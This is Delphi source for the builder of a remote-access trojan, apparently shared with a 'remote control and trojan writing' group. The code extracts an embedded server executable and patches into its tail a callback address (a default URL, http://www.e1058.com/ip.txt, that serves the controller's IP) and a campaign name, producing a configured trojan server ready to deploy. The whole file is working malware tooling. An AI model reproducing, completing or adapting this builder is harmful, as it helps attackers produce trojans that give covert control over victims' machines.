unit Unit3;
{作者BLOG ALALMN JACK     http://hi.baidu.com/alalmn  
远程控制和木马编写群30096995   }
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls,    IniFiles;

type
  Tserver = class(TForm)
    Label1: TLabel;
    Label2: TLabel;
    Edit1: TEdit;
    Edit2: TEdit;
    Button1: TButton;
    procedure Button1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
  private
    { Private declarations }
  public
  procedure Setfile1;
    { Public declarations }
  end;

var
  server: Tserver;
  myinifile:Tinifile;      //定义类型

implementation

{$R *.dfm}
{$R Server.RES}
function GetLength(Text: String): String;
Begin
  If (Length(Text) > 9) Then
    Result := IntToStr(Length(Text))
  Else
    Result := '0'+IntToStr(Length(Text));
End;

procedure Tserver.Setfile1;
var
   i:integer;
   F:File;
   S,temp:string;
   Str,Str1,str2,str3:array [1..100] of char;
begin
   s:=Edit1.Text;
   AssignFile(F,ExtractFilePath(Paramstr(0))+'server.exe');
   Reset(F,1);
   Seek(F,Filesize(F));
   For i:=1 to length(S) do Str[i]:=S[i];
   Blockwrite(F,Str,length(S));
   temp:= GetLength(S);
   For i:=1 to 2 do Str1[i]:=temp[i];
   Blockwrite(F,Str1,2);
   //ProgressBar1.Position :=75 ;   //进度条
   S:=Edit2.Text;
   For i:=1 to length(S) do Str2[i]:=S[i];
   Blockwrite(F,Str2,length(S));
   temp:= GetLength(S);
   For i:=1 to 2 do Str3[i]:=temp[i];
   Blockwrite(F,Str3,2);
   //ProgressBar1.Position :=90;  //进度条
   CloseFile(F);
   //ProgressBar1.Position := 0;    //进度条
   MessageBox(Application.Handle, '服务端生成完毕!', '提示', mb_ok);
end;

procedure Tserver.Button1Click(Sender: TObject);
var
  Res:TRESourceStream;
begin
    //ProgressBar1.Position := 0;    //进度条
    if FileExists(ExtractFilePath(Paramstr(0))+'Server.exe') then
       DeleteFile(ExtractFilePath(Paramstr(0))+'Server.exe');
    Res:= TRESourceStream.Create(Hinstance,'Server','exefile');
    //ProgressBar1.Position :=20;    //进度条

    Res.SaveToFile(ExtractFilePath(Paramstr(0))+'Server.exe');
    Res.Free;
    //ProgressBar1.Position :=50;    //进度条
    Sleep(200);
    if FileExists(ExtractFilePath(Paramstr(0))+'Server.exe') then
        Setfile1;
end;

procedure Tserver.FormCreate(Sender: TObject);
var
  filename:string;
begin
  filename:=ExtractFilePath(paramstr(0))+'alalmn.ini';                                 //把myini.ini文件存储在应用程序当前目录中
  myinifile:=TInifile.Create(filename);                                              //把myini.ini文件存储在应用程序当前目录中
  edit1.Text:= myinifile.readstring('Server','自动上线地址','http://www.e1058.com/ip.txt');
  edit2.text:= myinifile.readstring('Server','自动上线名称','龙客基地专版');
end;

procedure Tserver.FormDestroy(Sender: TObject);
begin
  myinifile.writestring('Server','自动上线地址',edit1.Text);
  myinifile.writestring('Server','自动上线名称',edit2.text);
  myinifile.Destroy;
end;

end.
